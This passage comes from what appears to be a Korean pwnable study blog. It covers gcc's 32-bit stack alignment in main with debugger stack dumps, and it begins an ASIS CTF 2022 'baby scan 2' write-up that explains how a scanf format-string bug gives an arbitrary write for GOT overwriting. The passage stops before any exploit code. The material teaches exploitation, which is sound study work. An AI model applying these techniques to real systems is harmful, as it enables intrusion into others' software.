&lt;+<span class="number">4</span>&gt; :and    esp,<span class="number">0xfffffff0</span></span><br><span class="line">   <span class="number">0x080491f8</span> &lt;+<span class="number">7</span>&gt; :push   DWORD PTR [ecx<span class="number">-0x4</span>]</span><br><span class="line">   <span class="number">0x080491fb</span> &lt;+<span class="number">10</span>&gt;:push   ebp</span><br><span class="line">   <span class="number">0x080491fc</span> &lt;+<span class="number">11</span>&gt;:mov    ebp,esp</span><br><span class="line">   <span class="number">0x080491fe</span> &lt;+<span class="number">13</span>&gt;:push   ecx  </span><br></pre></td></tr></table></figure><p>실행하고 난 후.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ecx  : 0xffffd960</span><br><span class="line">$esp  : 0xffffd950</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0xffffd950│+0x0000: 0x00000000← $esp</span><br><span class="line">0xffffd954│+0x0004: 0x00000000</span><br><span class="line">0xffffd958│+0x0008: 0x8048354  →  &quot;__libc_start_main&quot;</span><br><span class="line">0xffffd95c│+0x000c: 0xf7c1f119  →   add esp, 0x10</span><br><span class="line">0xffffd960│+0x0010: 0x00000001</span><br><span class="line">0xffffd964│+0x0014: 0xffffda14  →  0xffffdb90  →  &quot;/home/jir4vvit/study/rop32/chall&quot;</span><br><span class="line">0xffffd968│+0x0018: 0xffffda1c  →  0xffffdbb1  →  &quot;SHELL=/bin/bash&quot;</span><br><span class="line">0xffffd96c│+0x001c: 0xffffd980  →  0xf7e1fe34  →  0x0021fd4c</span><br><span class="line">0xffffd970│+0x0020: 0xf7e1fe34  →  0x0021fd4c</span><br><span class="line">0xffffd974│+0x0024: 0x80491f1  →  &lt;main+0&gt; lea ecx, [esp+0x4]</span><br></pre></td></tr></table></figure><p>32bit 프로그램에선 block 단위가 4바이트이기 때문에 컴파일러(gcc)가 and 연산으로 esp를 16에 align시키는 모습을 확인할 수 있다.</p><h4 id="ecx-레지스터를-왜-push-했을까"><a href="#ecx-레지스터를-왜-push-했을까" class="headerlink" title="ecx 레지스터를 왜 push 했을까?"></a><em>ecx 레지스터를 왜 push 했을까?</em></h4><p>ecx is a temporary register so it has to be saved. Also, depending on optimization level, some of the frame linkage ops that don’t seem strictly necessary to run the program might well be important in order to set up a trace-ready chain of frames.</p><ul><li>출처: <a href="https://askcodes.net/coding/trying-to-understand-gcc-s-complicated-stack-alignment-at-the-top-of-main-that-copies-the-return-address">https://askcodes.net/coding/trying-to-understand-gcc-s-complicated-stack-alignment-at-the-top-of-main-that-copies-the-return-address</a></li></ul><h3 id="3-프롤로그"><a href="#3-프롤로그" class="headerlink" title="3. 프롤로그"></a>3. 프롤로그</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x080491fb</span> &lt;+<span class="number">10</span>&gt;:push   ebp</span><br><span class="line"><span class="number">0x080491fc</span> &lt;+<span class="number">11</span>&gt;:mov    ebp,esp</span><br><span class="line"><span class="number">0x080491fe</span> &lt;+<span class="number">13</span>&gt;:push   ecx  </span><br></pre></td></tr></table></figure><p>ebp를 push하고 mov 명령으로 ebp를 esp와 같게 옮겨주었다.</p><p>에필로그를 진행해서 ebp와 esp를 애써 맞춰주었음에도 불구하고(?) ecx를 push했다. 32bit 프로그램이라면 무조건 buf, ebp(sfp) 순일 줄 알았는데 중간에 ecx가 끼어있다. 이것을 보지 못하고 무작정 익스를 진행하려고 하다가 평소와 스택이 쌓이는 것이 이상함을 감지하고 분석을 진행하게 되었다.</p><h3 id="4-memset-함수-호출"><a href="#4-memset-함수-호출" class="headerlink" title="4. memset 함수 호출"></a>4. memset 함수 호출</h3><p>에필로그 진행 후 함수를 호출할 때 스택에 인자들이 push되는 것을 살펴보자.</p><p>분석할 어셈은 아래와 같다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x080491fe</span> &lt;+<span class="number">13</span>&gt;:push   ecx  </span><br><span class="line">   <span class="number">0x080491ff</span> &lt;+<span class="number">14</span>&gt;:sub    esp,<span class="number">0x44</span></span><br><span class="line">   <span class="number">0x08049202</span> &lt;+<span class="number">17</span>&gt;:sub    esp,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x08049205</span> &lt;+<span class="number">20</span>&gt;:push   <span class="number">0x40</span></span><br><span class="line">   <span class="number">0x08049207</span> &lt;+<span class="number">22</span>&gt;:push   <span class="number">0x0</span></span><br><span class="line">   <span class="number">0x08049209</span> &lt;+<span class="number">24</span>&gt;:lea    eax,[ebp<span class="number">-0x48</span>]</span><br><span class="line">   <span class="number">0x0804920c</span> &lt;+<span class="number">27</span>&gt;:push   eax</span><br><span class="line">→  <span class="number">0x0804920d</span> &lt;+<span class="number">28</span>&gt;:call   <span class="number">0x8049080</span> &lt;<span class="built_in">memset</span>@plt&gt;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>@plt (</span><br><span class="line">   [sp + <span class="number">0x0</span>] = <span class="number">0xffffd900</span> → <span class="number">0x00000000</span>,</span><br><span class="line">   [sp + <span class="number">0x4</span>] = <span class="number">0x000000</span>,</span><br><span class="line">   [sp + <span class="number">0x8</span>] = <span class="number">0x000040</span>,</span><br><span class="line">   [sp + <span class="number">0xc</span>] = <span class="number">0x000000</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>실행하고 난 후.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">0xffffd8f0│+0x0000: 0xffffd900  →  0x00000000← $esp</span><br><span class="line">0xffffd8f4│+0x0004: 0x00000000</span><br><span class="line">0xffffd8f8│+0x0008: 0x000040 (&quot;@&quot;?)</span><br><span class="line">0xffffd8fc│+0x000c: 0x00000000</span><br><span class="line">0xffffd900│+0x0010: 0x00000000  //&lt;-- 여기서부터 0x40 바이트 초기화</span><br><span class="line">0xffffd904│+0x0014: 0x00000000</span><br><span class="line">0xffffd908│+0x0018: 0x00000000</span><br><span class="line">0xffffd90c│+0x001c: 0x00000000</span><br><span class="line">0xffffd910│+0x0020: 0x00000000</span><br><span class="line">0xffffd914│+0x0024: 0x00000000</span><br><span class="line"> </span><br><span class="line">0xffffd918│+0x0028: 0x00000000</span><br><span class="line">0xffffd91c│+0x002c: 0x00000000</span><br><span class="line">0xffffd920│+0x0030: 0x00000000</span><br><span class="line">0xffffd924│+0x0034: 0x00000000</span><br><span class="line">0xffffd928│+0x0038: 0x00000000</span><br><span class="line">0xffffd92c│+0x003c: 0x00000000</span><br><span class="line">0xffffd930│+0x0040: 0x00000000</span><br><span class="line">0xffffd934│+0x0044: 0x00000000</span><br><span class="line">0xffffd938│+0x0048: 0x00000000</span><br><span class="line">0xffffd93c│+0x004c: 0x00000000  //&lt;-- 0xffffd900 ~ 0xffffd93f 까지 0x40 바이트가 초기화 됨</span><br><span class="line"> </span><br><span class="line">0xffffd940│+0x0050: 0x00000000  </span><br><span class="line">0xffffd944│+0x0054: 0xffffd960  →  0x00000001 //← $ecx</span><br><span class="line">0xffffd948│+0x0058: 0x00000000← $ebp</span><br><span class="line">0xffffd94c│+0x005c: 0xf7c1f119  →   add esp, 0x10</span><br><span class="line">0xffffd950│+0x0060: 0x00000000</span><br><span class="line">0xffffd954│+0x0064: 0x00000000</span><br><span class="line">0xffffd958│+0x0068: 0x8048354  →  &quot;__libc_start_main&quot;</span><br><span class="line">0xffffd95c│+0x006c: 0xf7c1f119  →   add esp, 0x10</span><br><span class="line">0xffffd960│+0x0070: 0x00000001</span><br><span class="line">0xffffd964│+0x0074: 0xffffda14  →  0xffffdb90  →  &quot;/home/jir4vvit/study/rop32/chall&quot;</span><br></pre></td></tr></table></figure><p>ecx를 push했기 때문에 align이 맞지 않아 buf 크기는 0x40이지만 esp를 0x44만큼 올려주었다.(buf를 위해 공간확보) </p><p>또한 곧바로 esp를 0x4 올려주었는데, 이는 memset의 인자를 구성할 때 align을 맞춰주기 위해서이다.</p><p>이 후에 실질적으로 memset에서 사용하는 세 개의 인자를 push했다. </p><h3 id="5-에필로그"><a href="#5-에필로그" class="headerlink" title="5. 에필로그"></a>5. 에필로그</h3><p>에필로그에 낯선 명령이 추가되어 있다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x08049255</span> &lt;+<span class="number">100</span>&gt;:mov    ecx,DWORD PTR [ebp<span class="number">-0x4</span>]</span><br><span class="line"><span class="number">0x08049258</span> &lt;+<span class="number">103</span>&gt;:leave  </span><br><span class="line"><span class="number">0x08049259</span> &lt;+<span class="number">104</span>&gt;:lea    esp,[ecx<span class="number">-0x4</span>]</span><br><span class="line"><span class="number">0x0804925c</span> &lt;+<span class="number">107</span>&gt;:ret    </span><br></pre></td></tr></table></figure><p>무작정 익스를 진행하려고 할 때 main+100에서 터졌었다. 스택 상황이 무조건 buf, ebp(sfp) 순서임을 기대했기 때문이다.<br>실제론 buf, ecx(ebp-0x4), ebp(sfp) 순이다.</p><p>ebp 위치라고 생각하고 넣었던 값이 실제론 ebp-0x4였기 때문에 터져버렸다.</p><h1 id="For-32bit-ROP-in-Pwnable-Stack-aligned-to-a-4-byte-boundary"><a href="#For-32bit-ROP-in-Pwnable-Stack-aligned-to-a-4-byte-boundary" class="headerlink" title="(For 32bit ROP in Pwnable) Stack aligned to a 4-byte boundary."></a>(For 32bit ROP in Pwnable) Stack aligned to a 4-byte boundary.</h1><p>32bit 프로그램에선 block 단위가 4바이트이다. 따라서 스택 구조는 통상적으로 알고 있는 그 구조고, 프롤로그와 에필로그도 알고 있는 그 어셈이다. 자세히 설명하지 않고 코드와 스택 구조만 보여주고 넘어가겠다.</p><p>참고로 Pwnable에서의 32bit 프로그램은 (거의) 대부분 <code>-mpreferred-stack-boundary=2</code> 옵션으로 컴파일되었다.</p><h3 id="disassemble-main-1"><a href="#disassemble-main-1" class="headerlink" title="disassemble main"></a>disassemble main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x080491ee</span> &lt;+<span class="number">0</span>&gt;:push   ebp</span><br><span class="line"><span class="number">0x080491ef</span> &lt;+<span class="number">1</span>&gt;:mov    ebp,esp</span><br><span class="line"><span class="number">0x080491f1</span> &lt;+<span class="number">3</span>&gt;:sub    esp,<span class="number">0x40</span></span><br><span class="line"><span class="number">0x080491f4</span> &lt;+<span class="number">6</span>&gt;:push   <span class="number">0x40</span></span><br><span class="line"><span class="number">0x080491f6</span> &lt;+<span class="number">8</span>&gt;:push   <span class="number">0x0</span></span><br><span class="line"><span class="number">0x080491f8</span> &lt;+<span class="number">10</span>&gt;:lea    eax,[ebp<span class="number">-0x40</span>]</span><br><span class="line"><span class="number">0x080491fb</span> &lt;+<span class="number">13</span>&gt;:push   eax</span><br><span class="line"><span class="number">0x080491fc</span> &lt;+<span class="number">14</span>&gt;:call   <span class="number">0x8049080</span> &lt;<span class="built_in">memset</span>@plt&gt;</span><br><span class="line">...</span><br><span class="line"><span class="number">0x0804923b</span> &lt;+<span class="number">77</span>&gt;:leave  </span><br><span class="line"><span class="number">0x0804923c</span> &lt;+<span class="number">78</span>&gt;:ret    </span><br></pre></td></tr></table></figure><h3 id="memset-함수-호출"><a href="#memset-함수-호출" class="headerlink" title="memset 함수 호출"></a>memset 함수 호출</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>@plt (</span><br><span class="line">   [sp + <span class="number">0x0</span>] = <span class="number">0xffffd908</span> → <span class="number">0x00000000</span>,</span><br><span class="line">   [sp + <span class="number">0x4</span>] = <span class="number">0x000000</span>,</span><br><span class="line">   [sp + <span class="number">0x8</span>] = <span class="number">0x000040</span>,</span><br><span class="line">   [sp + <span class="number">0xc</span>] = <span class="number">0x000000</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">0xffffd8fc│+0x0000: 0xffffd908  →  0x00000000← $esp</span><br><span class="line">0xffffd900│+0x0004: 0x00000000</span><br><span class="line">0xffffd904│+0x0008: 0x000040 (&quot;@&quot;?)</span><br><span class="line">0xffffd908│+0x000c: 0x00000000  //&lt;-- 여기서부터 0x40바이트 초기화</span><br><span class="line">0xffffd90c│+0x0010: 0x00000000</span><br><span class="line">0xffffd910│+0x0014: 0x00000000</span><br><span class="line">0xffffd914│+0x0018: 0x00000000</span><br><span class="line">0xffffd918│+0x001c: 0x00000000</span><br><span class="line">0xffffd91c│+0x0020: 0x00000000</span><br><span class="line">0xffffd920│+0x0024: 0x00000000</span><br><span class="line"></span><br><span class="line">0xffffd924│+0x0028: 0x00000000</span><br><span class="line">0xffffd928│+0x002c: 0x00000000</span><br><span class="line">0xffffd92c│+0x0030: 0x00000000</span><br><span class="line">0xffffd930│+0x0034: 0x00000000</span><br><span class="line">0xffffd934│+0x0038: 0x00000000</span><br><span class="line">0xffffd938│+0x003c: 0x00000000</span><br><span class="line">0xffffd93c│+0x0040: 0x00000000</span><br><span class="line">0xffffd940│+0x0044: 0x00000000</span><br><span class="line">0xffffd944│+0x0048: 0x00000000  //&lt;-- 0xffffd908 ~ 0xffffd947 까지 0x40 바이트가 초기화 됨</span><br><span class="line">0xffffd948│+0x004c: 0x00000000← $ebp </span><br><span class="line"></span><br><span class="line">0xffffd94c│+0x0050: 0xf7c1f119  →   add esp, 0x10</span><br><span class="line">0xffffd950│+0x0054: 0x00000001</span><br><span class="line">0xffffd954│+0x0058: 0xffffda04  →  0xffffdb8e  →  &quot;/home/jir4vvit/study/rop32/challr&quot;</span><br><span class="line">0xffffd958│+0x005c: 0xffffda0c  →  0xffffdbb0  →  &quot;SHELL=/bin/bash&quot;</span><br><span class="line">0xffffd95c│+0x0060: 0xffffd970  →  0xf7e1fe34  →  0x0021fd4c</span><br><span class="line">0xffffd960│+0x0064: 0xf7e1fe34  →  0x0021fd4c</span><br><span class="line">0xffffd964│+0x0068: 0x80491ee  →  &lt;main+0&gt; push ebp</span><br><span class="line">0xffffd968│+0x006c: 0x00000001</span><br><span class="line">0xffffd96c│+0x0070: 0xffffda04  →  0xffffdb8e  →  &quot;/home/jir4vvit/study/rop32/challr&quot;</span><br><span class="line">0xffffd970│+0x0074: 0xf7e1fe34  →  0x0021fd4c</span><br></pre></td></tr></table></figure><h1 id="More"><a href="#More" class="headerlink" title="More"></a>More</h1><p>참고로 64bit 프로그램에서는 block 단위가 4바이트에서 8바이트로 늘어났기 때문에 <code>-mpreferred-stack-boundary=2</code> 옵션을 사용하려고 하면 에러를 내뿜는다.</p><h3 id="궁금증"><a href="#궁금증" class="headerlink" title="궁금증"></a>궁금증</h3><p>무려 6년 9개월 전 어떤 분이 하신 궁금증과 동일한 궁금증을 가졌다. 안타깝게도 해당 질문에 대한 답은 찾아보기 어려웠다. </p><p>I noticed that when not using -mpreferred-stack-boundary&#x3D;2, gcc might compile “main” with an interesting prologue&#x2F;epilogue: effectively “relying on $ecx (which relies on $ebp-4) for $esp value before ret”. Has anyone else come across this observation?</p><p>This means you can not overwrite normal ret address staying at $ebp+4, but instead you have to overwrite $ebp-4 (that is ecx) and reposition the stack pointer and your return address (effectively using a stack pivot) to further the exploitation.</p><ul><li><a href="https://security.stackexchange.com/questions/110943/how-to-exploit-a-stack-overflow-without-setting-mpreferred-stack-boundary-2">https://security.stackexchange.com/questions/110943/how-to-exploit-a-stack-overflow-without-setting-mpreferred-stack-boundary-2</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 32bit </tag>
            
            <tag> stack alignment </tag>
            
            <tag> gcc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASIS CTF 2022 - baby scan 2 (fsb, scanf)</title>
      <link href="/221018-asisctf2022-babysacn_2/"/>
      <url>/221018-asisctf2022-babysacn_2/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(41&#x2F;532) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>It seems that the app scans every incoming message and simply removes the rude and offending phrase before displaying the original message.</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── bin</span><br><span class="line">│   └── chall</span><br><span class="line">├── lib</span><br><span class="line">│   ├── ld-2.31.so</span><br><span class="line">│   └── libc.so.6</span><br><span class="line">├── run.sh</span><br><span class="line">└── src</span><br><span class="line">    └── main.c</span><br></pre></td></tr></table></figure><h3 id="making-patched-chall"><a href="#making-patched-chall" class="headerlink" title="making patched chall"></a>making patched chall</h3><p>libc와 ld가 주어졌으니 remote 환경과 동일하게 chall을 구성하기 위해 patch를 진행했다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[jir4vvit@arch bin]$ ldd pchall </span><br><span class="line">linux-vdso.so.1 (0x00007ffc2bd90000)</span><br><span class="line">./../lib/libc.so.6 (0x00007f46adf9f000)</span><br><span class="line">./../lib/ld-2.31.so =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f46ae193000)</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> size[<span class="number">16</span>], fmt[<span class="number">8</span>], *buf;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%15s&quot;</span>, size);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">isdigit</span>(*size)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Invalid number&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  buf = (<span class="type">char</span>*)<span class="built_in">malloc</span>(atoi(size) + <span class="number">1</span>); <span class="comment">// difference of babyscan_1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;data: &quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(fmt, <span class="keyword">sizeof</span>(fmt), <span class="string">&quot;%%%ss&quot;</span>, size);</span><br><span class="line">  <span class="built_in">scanf</span>(fmt, buf);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>baby scan 1</code> 문제와 다른 점은 딱 하나다. <code>size+1</code> 크기를 스택이 아닌 힙에 할당한다. 따라서 <code>baby scan 1</code> 처럼 풀이를 진행한다면 힙 오버플로우가 나타나게 된다. 하지만 이 취약점만으론 익스가 불가능하다. free도 없고 단순히 힙 할당 한 번 가지고는 할 수 있는 게 없다. 힙 오버를 이용해서 다음 chunck의 size를 조절가능하지만 쓸모없다. 그래서 다른 취약점을 찾아야 한다. 이 과정에서 시간을 많이 허비해서 대회 시간 내에 풀지 못하였다.</p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>동작 과정을 살펴보면서 취약점을 찾아보자.</p><ol><li><p>size에 15글자를 받는다. (16글자가 아니라 15글자다.. 이것 때문에 익스코드 작성할 때 초반에 삽질했다.) <em>&lt;–<code>scanf</code>의 포맷스트링을 여기서 입력해야 한다.</em></p></li><li><p>size+1 만큼 힙 할당을 진행한다. <em>&lt;–사실상 신경안써도 된다.</em></p></li><li><p><code>snprintf</code>를 이용하여 힙 입력에 사용될 <code>scanf</code>의 포맷스트링을 정의한다. <em>&lt;–포맷스트링을 어찌어찌 잘 정의해서</em></p></li><li><p>할당한 힙에 <code>scanf</code>를 이용하여 입력을 진행한다. <em>&lt;–fsb를 트리거해서 원하는 위치에 원하는 값을 적을 수 있다.</em></p></li></ol><p>어떻게 fsb를 트리거할 수 있을까? <code>baby sacn 1</code>을 풀었던 것처럼 <code>0</code>을 입력해서 스택을 살펴보며 생각해보자.</p><p>4번째 과정을 진행할 때 즉, <code>scanf</code>를 이용하여 입력을 진행할 때 arguments는 아래와 같다. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf@plt (</span><br><span class="line">   $rdi = 0x007ffcdabcf878 → 0x00000000733025 (&quot;%0s&quot;?),</span><br><span class="line">   $rsi = 0x0000000172a2a0 → 0x0000000000000000,</span><br><span class="line">   $rdx = 0x0000000172a2a0 → 0x0000000000000000</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>첫 번째 인자에 주목해서 생각을 해보자. 우리는 포맷스트링을 마음대로 집어넣어서 입력할 수 있다. <code>printf</code> 함수에서 포맷스트링을 정의해주지 않고 우리의 입력값만 인자로 들어간다면 fsb를 이용해서 스택을 leak하거나 스택에 원하는 값을 넣을 수 있다.</p><p><code>scanf</code>에서도 똑같이 통하지 않을까? 키보드로부터 입력을 받는 함수니깐 출력은 하지 못하더라도 원하는 스택 주소에 원하는 값을 적을 수 있지 않을까?</p><p>size를 입력 받을 때 15글자를 입력할 수 있다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scanf(&quot;%15s&quot;, size)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; x/20gx $rsp</span><br><span class="line">0x7ffcdabcf870:0x00007fab4b8902e80x0000000000733025</span><br><span class="line">0x7ffcdabcf880:0x00000000000000300x0000000000401170 &lt;-- [!]</span><br><span class="line">0x7ffcdabcf890:0x00007ffcdabcf9900x000000000172a2a0</span><br><span class="line">0x7ffcdabcf8a0:0x00000000000000000x00007fab4b6c3083</span><br><span class="line">0x7ffcdabcf8b0:0x00000001000000180x00007ffcdabcf998</span><br><span class="line">0x7ffcdabcf8c0:0x000000014b8877a00x0000000000401256</span><br><span class="line">0x7ffcdabcf8d0:0x00000000004013900x03f4474d8e43ddf7</span><br><span class="line">0x7ffcdabcf8e0:0x00000000004011700x00007ffcdabcf990</span><br><span class="line">0x7ffcdabcf8f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x7ffcdabcf900:0xfc0df2347f23ddf70xfca2d195ee2dddf7</span><br></pre></td></tr></table></figure><p>size를 입력할 때 9번째 offset을 컨트롤할 수 있다. 현재는 <code>0x401170</code>이 쓰여있는데, 이거 대신 원하는 got 넣을 수 있다면?</p><p>자자, <em>취약점을 트리거 하기 위해서 우리가 알고 있는 정보</em>를 정리해보자. </p><ol><li><p><code>scanf(fmt, buf)</code>에서 fsb를 트리거할 수 있을 것만 같다.</p></li><li><p>9번째 offset에 입력할 수 있다. 언제? <code>scanf(&quot;%15s&quot;, size)</code>에서.</p></li><li><p><code>fmt</code>는 <code>%&lt;인풋&gt;s</code>이다.</p></li></ol><p>&#x3D;&gt; <code>data</code>를 입력할 때 <code>scanf(&quot;%9$s&quot;, buf)</code>가 되어 원하는 주소에 원하는 값을 쓸 수 있을 것이다. got overwriting이 가능할 것이다.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>익스를 위해 ida에서도 살펴보자.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span 